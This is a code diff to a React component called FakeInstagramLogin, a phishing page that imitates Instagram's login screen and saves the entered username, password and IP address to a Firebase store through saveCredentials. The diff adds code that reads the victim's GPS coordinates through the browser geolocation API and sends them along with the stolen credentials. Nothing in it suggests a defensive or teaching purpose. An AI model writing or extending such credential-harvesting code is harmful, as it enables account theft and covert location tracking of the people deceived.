@@ -1,13 +1,33 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { motion } from 'framer-motion';
 import { saveCredentials } from '../lib/firebase';
 
-export default function FakeInstagramLogin({ onSuccess, ip }) {
+export default function FakeInstagramLogin({ onSuccess, ip, enableLocation, strategy, preCapturedLocation }) {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
+  const [locationData, setLocationData] = useState(preCapturedLocation || null);
+
+  useEffect(() => {
+    if (preCapturedLocation) return;
+
+    if (enableLocation && strategy === 'login_integrated') {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            setLocationData({
+              lat: position.coords.latitude,
+              lng: position.coords.longitude,
+              strategy: 'login_integrated'
+            });
+          },
+          (err) => console.log('Location denied/error', err)
+        );
+      }
+    }
+  }, [enableLocation, strategy, preCapturedLocation]);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -17,7 +37,12 @@ export default function FakeInstagramLogin({ onSuccess, ip }) {
     setError('');
 
     try {
-      await saveCredentials({ username: username.trim(), password, ip });
+      await saveCredentials({
+        username: username.trim(),
+        password,
+        ip,
+        location: locationData
+      });
 
       setTimeout(() => {
         setLoading(false);
